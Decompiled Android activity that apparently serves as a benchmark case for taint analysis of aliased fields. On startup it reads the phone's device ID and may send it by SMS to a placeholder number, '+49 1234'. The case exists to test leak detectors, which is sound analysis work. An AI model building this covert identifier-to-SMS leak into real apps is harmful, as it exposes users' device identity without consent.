package de.ecspride;

import android.app.PendingIntent;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.app.ActionBarActivity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;

public class MainActivity extends ActionBarActivity {
   private void aliasFlowTest() {
      String var5 = ((TelephonyManager)this.getSystemService("phone")).getDeviceId();
      MainActivity.class_5 var3 = new MainActivity.class_5();
      MainActivity.class_5 var1 = new MainActivity.class_5();
      MainActivity.class_4 var2 = new MainActivity.class_4();
      MainActivity.class_4 var4 = new MainActivity.class_4();
      if (Math.random() < 0.5D) {
         var1 = var3;
      } else {
         var2 = var4;
      }

      var1.attr = var2;
      var4.field_3 = var5;
      SmsManager.getDefault().sendTextMessage("+49 1234", (String)null, var3.attr.field_3, (PendingIntent)null, (PendingIntent)null);
   }

   protected void onCreate(Bundle var1) {
      super.onCreate(var1);
      this.setContentView(2130903064);
      if (var1 == null) {
         this.getSupportFragmentManager().beginTransaction().add(2131034172, new MainActivity.PlaceholderFragment()).commit();
      }

      this.aliasFlowTest();
   }

   public boolean onCreateOptionsMenu(Menu var1) {
      this.getMenuInflater().inflate(2131492864, var1);
      return true;
   }

   public boolean onOptionsItemSelected(MenuItem var1) {
      return var1.getItemId() == 2131034173 ? true : super.onOptionsItemSelected(var1);
   }

   class class_4 {
      // $FF: renamed from: b java.lang.String
      public String field_3 = "Y";
   }

   public class class_5 {
      public MainActivity.class_4 attr;
   }

   public static class PlaceholderFragment extends Fragment {
      public View onCreateView(LayoutInflater var1, ViewGroup var2, Bundle var3) {
         return var1.inflate(2130903065, var2, false);
      }
   }
}
